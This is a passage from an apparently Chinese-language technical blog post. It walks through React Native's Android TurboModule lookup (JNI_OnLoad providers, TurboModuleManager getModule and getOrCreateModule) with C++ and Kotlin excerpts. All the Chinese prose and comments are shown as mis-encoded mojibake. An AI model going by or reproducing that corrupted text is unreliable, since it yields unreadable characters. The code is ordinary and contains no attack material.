      cxxReactPackageProviders: <span class="hljs-type">List</span>&lt;(<span class="hljs-type">ReactContext</span>) -&gt; <span class="hljs-type">CxxReactPackage</span>&gt; = emptyList()</span></span>,
      exceptionHandler: (Exception) -&gt; <span class="hljs-built_in">Unit</span> = { <span class="hljs-keyword">throw</span> it },
      bindingsInstaller: BindingsInstaller? = <span class="hljs-literal">null</span>,
  ): ReactHost {
    <span class="hljs-comment">//......</span>
  }
</code></pre>
<p><code>DefaultTurboModules::getTurboModule</code>æ˜¯æŸ¥æ‰¾çš„æ˜¯RNæ¡†æ¶å†…éƒ¨å®šä¹‰çš„C++ TurboModuleï¼Œé‡ç‚¹éœ€è¦å…³æ³¨ä¸€ä¸‹<code>DefaultTurboModuleManagerDelegate::cxxModuleProvider</code>ï¼Œè¿™é‡Œæ˜¯æŸ¥æ‰¾ç¬¬ä¸‰æ–¹çš„C++ TurboModuleã€‚</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-comment">// DefaultTurboModuleManagerDelegate.cpp</span>
std::function&lt;std::shared_ptr&lt;TurboModule&gt;(
    <span class="hljs-type">const</span> std::string&amp;,
    <span class="hljs-type">const</span> std::shared_ptr&lt;CallInvoker&gt;&amp;)&gt;
    DefaultTurboModuleManagerDelegate::cxxModuleProvider{<span class="hljs-literal">nullptr</span>};
</code></pre>
<p>å¯ä»¥çœ‹åˆ°<code>cxxModuleProvider</code>å®é™…ä¸Šæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œåªä¸è¿‡æ˜¯ä¸€ä¸ªå‡½æ•°ç±»å‹çš„å˜é‡ã€‚é‚£ä¹ˆæ­¤å˜é‡æ˜¯åœ¨å“ªé‡Œèµ‹å€¼çš„å‘¢ï¼Ÿé€šè¿‡å…¨å±€æœç´¢ï¼Œåªæœ‰ä¸€å¤„è¿›è¡Œäº†è®¾ç½®ï¼Œæºç <code>react-native/packages/react-native/ReactAndroid/cmake-utils/default-app-setup/OnLoad.cpp</code>ï¼š</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-function">JNIEXPORT jint JNICALL <span class="hljs-title">JNI_OnLoad</span><span class="hljs-params">(JavaVM* vm, <span class="hljs-type">void</span>*)</span> </span>{
  <span class="hljs-keyword">return</span> facebook::jni::<span class="hljs-built_in">initialize</span>(vm, [] {
    facebook::react::DefaultTurboModuleManagerDelegate::cxxModuleProvider =
        &amp;facebook::react::cxxModuleProvider;
    facebook::react::DefaultTurboModuleManagerDelegate::javaModuleProvider =
        &amp;facebook::react::javaModuleProvider;
    facebook::react::DefaultComponentsRegistry::
        registerComponentDescriptorsFromEntryPoint =
            &amp;facebook::react::registerComponents;
  });
}

<span class="hljs-function">std::shared_ptr&lt;TurboModule&gt; <span class="hljs-title">cxxModuleProvider</span><span class="hljs-params">(
    <span class="hljs-type">const</span> std::string&amp; name,
    <span class="hljs-type">const</span> std::shared_ptr&lt;CallInvoker&gt;&amp; jsInvoker)</span> </span>{
  <span class="hljs-comment">// Here you can provide your CXX Turbo Modules coming from</span>
  <span class="hljs-comment">// either your application or from external libraries. The approach to follow</span>
  <span class="hljs-comment">// is similar to the following (for a module called `NativeCxxModuleExample`):</span>
  <span class="hljs-comment">//</span>
  <span class="hljs-comment">// if (name == NativeCxxModuleExample::kModuleName) {</span>
  <span class="hljs-comment">//   return std::make_shared&lt;NativeCxxModuleExample&gt;(jsInvoker);</span>
  <span class="hljs-comment">// }</span>

  <span class="hljs-comment">// And we fallback to the CXX module providers autolinked</span>
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">autolinking_cxxModuleProvider</span>(name, jsInvoker);

  <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
}
</code></pre>
<p>è¿™é‡Œå…¶å®å°±æ˜¯åœ¨<code>libappmodules.so</code>åŠ è½½æ—¶è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œæœ€ç»ˆæ˜¯è°ƒç”¨çš„<code>autolinking_cxxModuleProvider</code>æ¥è‡ªåŠ¨å®Œæˆä¸‰æ–¹åº“çš„C++ TurboModuleæ³¨å†Œã€‚æ¯«æ— ç–‘é—®ï¼Œè‚¯å®šåˆæ˜¯åŸºäºcodegenå·¥å…·è¿›è¡Œäº†è‡ªåŠ¨ä»£ç ç”Ÿæˆï¼Œå…·ä½“ä»£ç ç”Ÿæˆé€»è¾‘ï¼Œæ”¾åˆ°åé¢å†ç ”ç©¶ã€‚ä½†æ˜¯æŸ¥æ‰¾é€»è¾‘æˆ‘ä»¬å·²ç»éå¸¸æ¸…æ™°ï¼Œæœ€ç»ˆå°±æ˜¯åˆ›å»ºäº†ç±»ä¼¼<code>NativeCxxModuleExample</code>è¿™æ ·çš„çº¯C++ä¸‰æ–¹TurboModuleå¯¹è±¡ã€‚</p>
<h4 data-id="heading-7">Java TurboModule</h4>
<p>æ¥ä¸‹æ¥å†çœ‹å¦ä¸€æ¡çº¿Java TurboModuleçš„æŸ¥æ‰¾ï¼Œå¯ä»¥åˆ†ä¸ºä¸¤æ­¥ï¼Œé¦–å…ˆæ˜¯Javaå±‚çš„è°ƒç”¨ï¼Œå°†è¿”å›çš„<code>TurboModule</code>å®ä¾‹å°è£…åˆ°<code>InitParams</code>ç»“æ„ä¸­ä½œä¸ºå‚æ•°ï¼Œå†æ¬¡è°ƒç”¨C++å±‚çš„<code>getTurboModule</code>ï¼š</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-comment">// TurboModuleManager.cpp</span>

<span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> getTurboJavaModule = javaPart-&gt;<span class="hljs-built_in">getClass</span>()-&gt;
                                          getMethod&lt;jni::<span class="hljs-built_in">alias_ref</span>&lt;JTurboModule&gt;(<span class="hljs-type">const</span> std::string&amp;)&gt;(<span class="hljs-string">"getTurboJavaModule"</span>);
<span class="hljs-comment">// Javaå±‚çš„è°ƒç”¨</span>
<span class="hljs-keyword">auto</span> moduleInstance = <span class="hljs-built_in">getTurboJavaModule</span>(javaPart.<span class="hljs-built_in">get</span>(), name);
<span class="hljs-keyword">if</span> (moduleInstance) {
  TurboModulePerfLogger::<span class="hljs-built_in">moduleJSRequireEndingStart</span>(moduleName);
  JavaTurboModule::InitParams params = {
      .moduleName = name,
      .instance = moduleInstance,
      .jsInvoker = jsCallInvoker_,
      .nativeMethodCallInvoker = nativeMethodCallInvoker_};
  <span class="hljs-comment">// C++å±‚çš„è°ƒç”¨</span>
  <span class="hljs-keyword">auto</span> turboModule = cxxDelegate-&gt;<span class="hljs-built_in">getTurboModule</span>(name, params);
  <span class="hljs-comment">// çœç•¥......</span>
  <span class="hljs-keyword">return</span> turboModule;
}
</code></pre>
<p>Javaå±‚æ˜¯é€šè¿‡JNIåå°„å¹¶è°ƒç”¨kotlinç±»<code>TurboModuleManager</code>ä¸­çš„<code>getTurboJavaModule</code>æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// TurboModuleManager.kt</span>

<span class="hljs-meta">@Suppress(<span class="hljs-string">"unused"</span>)</span>
<span class="hljs-meta">@DoNotStrip</span>
<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getTurboJavaModule</span><span class="hljs-params">(moduleName: <span class="hljs-type">String</span>)</span></span>: TurboModule? {
  <span class="hljs-comment">/*
   * è¿™ä¸ª API ä» global.__turboModuleProxy è°ƒç”¨
   * åªæœ‰å½“ native æ¨¡å—æ˜¯ turbo æ¨¡å—æ—¶æ‰è°ƒç”¨ getModule
   */</span>
  <span class="hljs-keyword">if</span> (!isTurboModule(moduleName)) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
  }

  <span class="hljs-keyword">val</span> module = getModule(moduleName)
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (module !<span class="hljs-keyword">is</span> CxxModuleWrapper &amp;&amp; module <span class="hljs-keyword">is</span> TurboModule) module <span class="hljs-keyword">else</span> <span class="hljs-literal">null</span>
}

<span class="hljs-comment">/**
 * è¿”å›ä¸æä¾›çš„ moduleName å¯¹åº”çš„ NativeModule å®ä¾‹ã€‚
 *
 * æ­¤æ–¹æ³•ï¼š
 * - å¦‚æœæ¨¡å—å°šä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºå¹¶åˆå§‹åŒ–è¯¥æ¨¡å—
 * - åœ¨ TurboModuleManager è¢«é”€æ¯åè¿”å› null
 */</span>
<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getModule</span><span class="hljs-params">(moduleName: <span class="hljs-type">String</span>)</span></span>: NativeModule? {
  <span class="hljs-keyword">val</span> moduleHolder: ModuleHolder?

  synchronized(moduleCleanupLock) {
    <span class="hljs-keyword">if</span> (moduleCleanupStarted) {   <span class="hljs-comment">// æ£€æŸ¥æ ‡å¿—ï¼Œåˆ¤æ–­ TurboModuleManager æ˜¯å¦æ­£åœ¨æ¸…ç†ï¼ˆè°ƒç”¨äº† invalidate()ï¼‰</span>
      <span class="hljs-comment">/*
       * æ¸…ç†å¼€å§‹åæ€»æ˜¯è¿”å› nullï¼Œè¿™æ · getNativeModule(moduleName) è¿”å› null
       */</span>
      FLog.e(
          TAG,
          <span class="hljs-string">"getModule(): Tried to get module \"%s\", but TurboModuleManager was tearing down (legacy: %b, turbo: %b)"</span>,
          moduleName,
          isLegacyModule(moduleName),
          isTurboModule(moduleName),
      )
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>   <span class="hljs-comment">// å› nullï¼Œæ‹’ç»åˆ›å»ºæ–°æ¨¡å—</span>
    }
    <span class="hljs-comment">/*
     * TODO(T64619790): æˆ‘ä»¬æ˜¯å¦åº”è¯¥æå‰å¡«å…… moduleHoldersï¼Œä»¥é¿å…å¿…é¡»æ§åˆ¶å¯¹å®ƒçš„å¹¶å‘è®¿é—®ï¼Ÿ
     */</span>
    <span class="hljs-keyword">if</span> (!moduleHolders.containsKey(moduleName)) {
      moduleHolders[moduleName] = ModuleHolder()
    }
    moduleHolder = moduleHolders[moduleName]
  }

  <span class="hljs-keyword">if</span> (moduleHolder == <span class="hljs-literal">null</span>) {
    FLog.e(TAG, <span class="hljs-string">"getModule(): Tried to get module \"%s\", but moduleHolder was null"</span>, moduleName)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
  }

  TurboModulePerfLogger.moduleCreateStart(moduleName, moduleHolder.moduleId)
  <span class="hljs-comment">// è·å–æˆ–åˆ›å»ºæ¨¡å—</span>
  <span class="hljs-keyword">val</span> module = getOrCreateModule(moduleName, moduleHolder, <span class="hljs-literal">true</span>)

  <span class="hljs-keyword">if</span> (module != <span class="hljs-literal">null</span>) {
    TurboModulePerfLogger.moduleCreateEnd(moduleName, moduleHolder.moduleId)
  } <span class="hljs-keyword">else</span> {
    TurboModulePerfLogger.moduleCreateFail(moduleName, moduleHolder.moduleId)
  }

  <span class="hljs-keyword">return</span> module
}

<span class="hljs-comment">/**
 * ç»™å®šä¸€ä¸ª ModuleHolder å’Œ TurboModule çš„ moduleNameï¼Œè¿”å› TurboModule å®ä¾‹ã€‚
 *
 * ä½¿ç”¨ ModuleHolder æ¥ç¡®ä¿å¦‚æœ n ä¸ªçº¿ç¨‹ç«äº‰åˆ›å»º TurboModule xï¼Œé‚£ä¹ˆåªæœ‰
 * ç¬¬ä¸€ä¸ªçº¿ç¨‹åˆ›å»º xã€‚å…¶ä»– n - 1 ä¸ªçº¿ç¨‹ä¼šç­‰å¾…ï¼Œç›´åˆ° x è¢«åˆ›å»ºå¹¶åˆå§‹åŒ–å®Œæˆã€‚
 */</span>
<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getOrCreateModule</span><span class="hljs-params">(
    moduleName: <span class="hljs-type">String</span>,
    moduleHolder: <span class="hljs-type">ModuleHolder</span>,
    shouldPerfLog: <span class="hljs-type">Boolean</span>,
)</span></span>: NativeModule? {
  <span class="hljs-keyword">var</span> shouldCreateModule = <span class="hljs-literal">false</span>

  synchronized(moduleHolder) {
    <span class="hljs-keyword">if</span> (moduleHolder.isDoneCreatingModule) {
      <span class="hljs-keyword">if</span> (shouldPerfLog) {
        TurboModulePerfLogger.moduleCreateCacheHit(moduleName, moduleHolder.moduleId)
      }

      <span class="hljs-keyword">return</span> moduleHolder.module
    }
    <span class="hljs-keyword">if</span> (!moduleHolder.isCreatingModule) {
      <span class="hljs-comment">// åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½åˆ°è¾¾è¿™é‡Œã€‚</span>
      shouldCreateModule = <span class="hljs-literal">true</span>
      moduleHolder.startCreatingModule()
    }
  }

  <span class="hljs-keyword">if</span> (shouldCreateModule) {
    TurboModulePerfLogger.moduleCreateConstructStart(moduleName, moduleHolder.moduleId)
    <span class="hljs-keyword">var</span> nativeModule = turboModuleProvider.getModule(moduleName)

    <span class="hljs-keyword">if</span> (nativeModule == <span class="hljs-literal">null</span>) {
      <span class="hljs-comment">// å›é€€åˆ° Legacy </span>
      nativeModule = legacyModuleProvider.getModule(moduleName)
    }

    TurboModulePerfLogger.moduleCreateConstructEnd(moduleName, moduleHolder.moduleId)
    TurboModulePerfLogger.moduleCreateSetUpStart(moduleName, moduleHolder.moduleId)

    <span class="hljs-keyword">if</span> (nativeModule != <span class="hljs-literal">null</span>) {
      synchronized(moduleHolder) { moduleHolder.module = nativeModule }

      <span class="hljs-comment">/*
       * TurboModuleManager åœ¨ ReactApplicationContext è®¾ç½®å®Œæˆååˆå§‹åŒ–
       * NativeModules åº”è¯¥åœ¨ ReactApplicationContext è®¾ç½®å®Œæˆååˆå§‹åŒ–
       * å› æ­¤ï¼Œæˆ‘ä»¬ç°åœ¨åº”è¯¥åˆå§‹åŒ– TurboModule
       */</span>
      nativeModule.initialize()
    } <span class="hljs-keyword">else</span> {
      FLog.e(
          TAG,
          <span class="hljs-string">"getOrCreateModule(): Unable to create module \"%s\" (legacy: %b, turbo: %b)"</span>,
          moduleName,
          isLegacyModule(moduleName),
          isTurboModule(moduleName),
      )
    }

    <span class="hljs-comment">// æ ‡è®°åˆ›å»ºå®Œæˆå¹¶å”¤é†’ç­‰å¾…çº¿ç¨‹</span>
    TurboModulePerfLogger.moduleCreateSetUpEnd(moduleName, moduleHolder.moduleId)
    synchronized(moduleHolder) {
      moduleHolder.endCreatingModule()
      (moduleHolder <span class="hljs-keyword">as</span> Object).notifyAll()
    }

    <span class="hljs-keyword">return</span> nativeModule
  }

  synchronized(moduleHolder) {
    <span class="hljs-keyword">var</span> wasInterrupted = <span class="hljs-literal">false</span>
    <span class="hljs-keyword">while</span> (moduleHolder.isCreatingModule) {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// ç­‰å¾…ç›´åˆ° TurboModule è¢«åˆ›å»ºå’Œåˆå§‹åŒ–</span>
        (moduleHolder <span class="hljs-keyword">as</span> Object).wait()
      } <span class="hljs-keyword">catch</span> (e: InterruptedException) {
        wasInterrupted = <span class="hljs-literal">true</span>
      }
    }

    <span class="hljs-keyword">if</span> (wasInterrupted) {
      <span class="hljs-comment">/*
       * TurboModules ç†æƒ³æƒ…å†µä¸‹åº”è¯¥å¿«é€Ÿåˆ›å»ºå’Œåˆå§‹åŒ–ã€‚å› æ­¤ï¼Œ
       * æˆ‘ä»¬ç­‰åˆ° TurboModule å®Œæˆåˆå§‹åŒ–åå†é‡æ–°ä¸­æ–­å½“å‰çº¿ç¨‹ã€‚
       */</span>
      Thread.currentThread().interrupt()
    }
    <span class="hljs-keyword">return</span> moduleHolder.module
  }
}
</code></pre>
<p>ä»£ç ä¸éš¾ç†è§£ï¼Œæˆ‘ä»¬æ¦‚æ‹¬ä¸€ä¸‹æµç¨‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          ç¬¬ä¸€å±‚ï¼šgetTurboJavaModule                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  æ ¸å¿ƒæ­¥éª¤ï¼š                                               â”‚
â”‚  1. æ£€æŸ¥æ˜¯å¦æ˜¯ TurboModuleï¼ˆç±»å‹éªŒè¯ï¼‰                    â”‚
â”‚  2. è°ƒç”¨ getModule è·å–æ¨¡å—                               â”‚
â”‚  3. è¿‡æ»¤è¿”å›ï¼šåªè¿”å› Java TurboModule                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">                      â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              ç¬¬äºŒå±‚ï¼šgetModule                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  æ ¸å¿ƒæ­¥éª¤ï¼š                                               â”‚
â”‚  1. æ£€æŸ¥æ¸…ç†çŠ¶æ€ï¼ˆæ‹’ç»åˆ›å»ºï¼‰                              â”‚
â”‚  2. è·å–æˆ–åˆ›å»º ModuleHolderï¼ˆæ¨¡å—æŒæœ‰è€…ï¼‰                 â”‚
â”‚  3. è°ƒç”¨ getOrCreateModule æ‰§è¡Œå®é™…åˆ›å»º                   â”‚
â”‚  4. è®°å½•æ€§èƒ½æ—¥å¿—                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                      â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          ç¬¬ä¸‰å±‚ï¼šgetOrCreateModule                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  æ ¸å¿ƒæ­¥éª¤ï¼š                                               â”‚
â”‚  1. ç«äº‰æ£€æµ‹ï¼šæ£€æŸ¥ç¼“å­˜æˆ–æ ‡è®°åˆ›å»º                          â”‚
â”‚  2. åˆ›å»ºé€»è¾‘ï¼ˆèƒœå‡ºçº¿ç¨‹ï¼‰ï¼š                                â”‚
â”‚     - è°ƒç”¨æä¾›è€…åˆ›å»ºæ¨¡å—å®ä¾‹                              â”‚
â”‚     - åˆå§‹åŒ–æ¨¡å—                                          â”‚
â”‚     - å”¤é†’ç­‰å¾…çº¿ç¨‹                                        â”‚
â”‚  3. ç­‰å¾…é€»è¾‘ï¼ˆå…¶ä»–çº¿ç¨‹ï¼‰ï¼š                                â”‚
â”‚     - ç­‰å¾…åˆ›å»ºå®Œæˆ                                        â”‚
â”‚     - è¿”å›ç¼“å­˜çš„æ¨¡å—                                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                      â†“
            è¿”å› TurboModule å®ä¾‹
</span></code></pre>
<p>æœ€åï¼Œå†æ¥çœ‹ä¸€ä¸‹<code>turboModuleProvider.getModule</code>æ–¹æ³•çš„å®ç°ã€‚åœ¨å‰é¢<code>TurboModuleManager</code>åˆå§‹åŒ–ä¸€èŠ‚æˆ‘ä»¬å·²ç»çŸ¥é“äº†<code>turboModuleProvider</code>å®é™…ä¸Šæ˜¯ä¸ªé—­åŒ…ï¼Œå†…éƒ¨å…¶å®å°±æ˜¯è°ƒç”¨çš„<code>TurboModuleManagerDelegate</code>ç±»å‹çš„<code>getModule</code>æ–¹æ³•è¿”å›Moduleã€‚å…¶å…·ä½“å®ç°åˆ™æ˜¯åœ¨å…¶å­ç±»<code>ReactPackageTurboModuleManagerDelegate</code>ä¸­ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ReactPackageTurboModuleManagerDelegate.kt</span>
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getModule</span><span class="hljs-params">(moduleName: <span class="hljs-type">String</span>)</span></span>: TurboModule? {
    <span class="hljs-keyword">var</span> resolvedModule: NativeModule? = <span class="hljs-literal">null</span>

    <span class="hljs-keyword">for</span> (moduleProvider <span class="hljs-keyword">in</span> moduleProviders) {
      <span class="hljs-keyword">val</span> moduleInfo: ReactModuleInfo? = packageModuleInfos[moduleProvider]?.<span class="hljs-keyword">get</span>(moduleName)
      <span class="hljs-keyword">if</span> (
          moduleInfo?.isTurboModule == <span class="hljs-literal">true</span> &amp;&amp;
              (resolvedModule == <span class="hljs-literal">null</span> || moduleInfo.canOverrideExistingModule)
      ) {
        <span class="hljs-keyword">val</span> module = moduleProvider.getModule(moduleName)
        <span class="hljs-keyword">if</span> (module != <span class="hljs-literal">null</span>) {
          resolvedModule = module
        }
      }
    }

    <span class="hljs-comment">// è·³è¿‡ä¸ TurboModule ä¸å…¼å®¹çš„æ¨¡å—</span>
    <span class="hljs-keyword">val</span> isLegacyModule = resolvedModule !<span class="hljs-keyword">is</span> TurboModule
    <span class="hljs-keyword">if</span> (isLegacyModule) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
    }

    <span class="hljs-keyword">return</span> resolvedModule <span class="hljs-keyword">as</span> TurboModule
  }
</code></pre>
<p>ç°åœ¨å†çœ‹C++å±‚çš„è°ƒç”¨ï¼š</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-comment">// DefaultTurboModuleManagerDelegate.cpp</span>
<span class="hljs-function">std::shared_ptr&lt;TurboModule&gt; <span class="hljs-title">DefaultTurboModuleManagerDelegate::getTurboModule</span><span class="hljs-params">(
    <span class="hljs-type">const</span> std::string&amp; name,
    <span class="hljs-type">const</span> JavaTurboModule::InitParams&amp; params)</span> </span>{
  <span class="hljs-keyword">auto</span> moduleProvider = DefaultTurboModuleManagerDelegate::javaModuleProvider;
  <span class="hljs-keyword">if</span> (moduleProvider) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> resolvedModule = <span class="hljs-built_in">moduleProvider</span>(name, params)) {
      <span class="hljs-keyword">return</span> resolvedModule;
    }
  }

  <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
}
</code></pre>
<p><code>javaModuleProvider</code>æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œè·Ÿå‰é¢åˆ†æC++ TurboModuleçš„<code>cxxModuleProvider</code>ä¸€æ ·ï¼Œéƒ½åœ¨åŒä¸€ä¸ªåœ°æ–¹èµ‹å€¼ï¼š</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-comment">// OnLoad.cpp</span>
<span class="hljs-function">JNIEXPORT jint JNICALL <span class="hljs-title">JNI_OnLoad</span><span class="hljs-params">(JavaVM* vm, <span class="hljs-type">void</span>*)</span> </span>{
  <span class="hljs-keyword">return</span> facebook::jni::<span class="hljs-built_in">initialize</span>(vm, [] {
    facebook::react::DefaultTurboModuleManagerDelegate::cxxModuleProvider =
        &amp;facebook::react::cxxModuleProvider;
    facebook::react::DefaultTurboModuleManagerDelegate::javaModuleProvider =
        &amp;facebook::react::javaModuleProvider;
    <span class="hljs-comment">// çœç•¥......</span>
  });
}

<span class="hljs-function">std::shared_ptr&lt;TurboModule&gt; <span class="hljs-title">javaModuleProvider</span><span class="hljs-params">(
    <span class="hljs-type">const</span> std::string&amp; name,
    <span class="hljs-type">const</span> JavaTurboModule::InitParams&amp; params)</span> </span>{
  <span class="hljs-comment">// æä¾›è‡ªå·±çš„æ¨¡å—æä¾›è€…ã€‚ éµå¾ªçš„æ–¹æ³•ç±»ä¼¼äºä»¥ä¸‹ç¤ºä¾‹ï¼ˆå¯¹äºåä¸º `samplelibrary`çš„åº“ï¼‰ï¼š</span>
  <span class="hljs-comment">//</span>
  <span class="hljs-comment">// auto module = samplelibrary_ModuleProvider(name, params);</span>
  <span class="hljs-comment">// if (module != nullptr) {</span>
  <span class="hljs-comment">//    return module;</span>
  <span class="hljs-comment">// }</span>
  <span class="hljs-comment">// return rncore_ModuleProvider(name, params);</span>

  <span class="hljs-comment">// é“¾æ¥åº”ç”¨ç¨‹åºæœ¬åœ°æ¨¡å—ï¼ˆå¦‚æœå¯ç”¨ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> REACT_NATIVE_APP_MODULE_PROVIDER</span>
  <span class="hljs-keyword">auto</span> <span class="hljs-keyword">module</span> = <span class="hljs-built_in">REACT_NATIVE_APP_MODULE_PROVIDER</span>(name, params);
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">module</span> != <span class="hljs-literal">nullptr</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">module</span>;
  }
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>

  <span class="hljs-comment">// é¦–å…ˆå°è¯•æŸ¥æ‰¾ React Native æ ¸å¿ƒæ¨¡å—</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> <span class="hljs-keyword">module</span> = <span class="hljs-built_in">FBReactNativeSpec_ModuleProvider</span>(name, params)) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">module</span>;
  }

  <span class="hljs-comment">// å›é€€åˆ°è‡ªåŠ¨é“¾æ¥çš„æ¨¡å—æä¾›è€…</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> <span class="hljs-keyword">module</span> = <span class="hljs-built_in">autolinking_ModuleProvider</span>(name, params)) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">module</span>;
  }

  <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
}
</code></pre>
<p>è¿™é‡Œä¸‰æ–¹åº“ä¾ç„¶æ˜¯èµ°çš„è‡ªåŠ¨é“¾æ¥å‡½æ•°<code>autolinking_ModuleProvider</code>ã€‚æ˜¾ç„¶è¿™ä¹Ÿæ˜¯é€šè¿‡Codegenè‡ªåŠ¨ç”Ÿæˆçš„ä»£ç ï¼Œæˆ‘ä»¬æ”¾åˆ°åé¢å†ä¸€èµ·ç ”ç©¶ã€‚</p>
<p>åŸºæœ¬åˆ°è¿™é‡Œï¼Œç»“åˆæˆ‘ä»¬å‰é¢å¯¹<code>moduleProviders</code>åˆå§‹åŒ–çš„åˆ†æï¼Œæ•´å¥—å®‰å“çš„TurboModuleåˆå§‹åŒ–åŠå…¶è°ƒç”¨æµç¨‹éƒ½å·²ç»é€šäº†ã€‚å‰©ä¸‹çš„ï¼Œå°±æ˜¯React Nativeæ˜¯å¦‚ä½•æ‰«æå¹¶è‡ªåŠ¨å°†é¡¹ç›®ä¾èµ–çš„ç¬¬ä¸‰æ–¹TurboModuleè¿›è¡Œæ”¶é›†æ³¨å†Œã€‚</p>
<h3 data-id="heading-8">TurboModule æ³¨å†Œ</h3>
<h4 data-id="heading-9">Autolinking æœºåˆ¶å‰–æ</h4>
<p>Autolinking æœºåˆ¶åœ¨å®‰å“å¹³å°æ˜¯åŸºäºGradle æ’ä»¶ç³»ç»Ÿæ¥å®ç°è‡ªåŠ¨å¤„ç†çš„ã€‚</p>
<h5 data-id="heading-10">Android Gradle æ„å»ºæœºåˆ¶</h5>
<p>ç®€è¦ä»‹ç»ä¸€ä¸‹Android Gradle æ„å»ºæœºåˆ¶åŸç†: <strong>Gradle æ„å»ºç”Ÿå‘½å‘¨æœŸ</strong></p>
